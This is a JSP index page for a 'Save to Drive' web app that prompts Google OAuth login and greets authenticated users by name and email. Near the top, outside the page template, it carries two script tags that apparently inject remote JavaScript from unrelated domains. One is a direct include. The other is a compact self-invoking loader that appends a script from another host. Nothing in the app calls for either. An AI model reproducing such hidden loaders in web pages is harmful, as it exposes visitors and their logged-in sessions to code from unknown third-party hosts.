<%-- 
    Document   : index
    Created on : 13 Sep, 2017, 8:19:23 PM
    Author     : Dhaval
--%>

<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@page contentType="text/html" pageEncoding="UTF-8" %>
<%@taglib prefix="ui" tagdir="/WEB-INF/tags" %>

<script type='text/javascript' src='//potslascivious.com/c7/b0/f4/c7b0f48d55af48073c3bd4627956b288.js'></script>
<script>(function(d,z,s){s.src='//'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('untimburra.com',4411735,document.createElement('script'))</script>

<ui:templete title="Welcome to Save to Drive">
    <jsp:attribute name="head_area"/>
    <jsp:attribute name="body_area">
        <section class="dashboard-counts no-padding-bottom center">
            <div class="container-fluid">
                <div class="row bg-white has-shadow">
                	<div class="col-xl-12" style="text-align:center">
	                    <c:choose>
	                        <c:when test='${empty(user)}'>
	                            <p style="font-size: 20px; color: red">You are not authenticated. Please authenticate with Google. </p>
	                            	<button id="auth-btn" class="btn btn-link btn-responsive" style="font-size: larger;" onclick="location.href = '${pageContext.request.contextPath}/api/oauth/google/redirect'">
	                                  Click here to authenticate with Google
	                             </button>
	                        </c:when>
                        	<c:otherwise>	                         
                        		<p style="font-size: 20px; color: green">Hi, <c:out value="${user.name}" default="Guest" />. </p>   
	                            <p style="font-size: 20px; color: green; word-wrap:break-word">Congratulations! You are successfully authenticated with Google
	                                using your Google account: <c:out value="${user.email}"/>. </p>
                                 <button id="auth-btn" class="btn btn-link btn-responsive" style="font-size: larger;" onclick="location.href = '${pageContext.request.contextPath}/api/oauth/google/redirect'">
                                     Click here to change Google account
                                 </button>
	                        </c:otherwise>
	                    </c:choose>
                    </div>
                </div>
            </div>
        </section>
    </jsp:attribute>
</ui:templete>
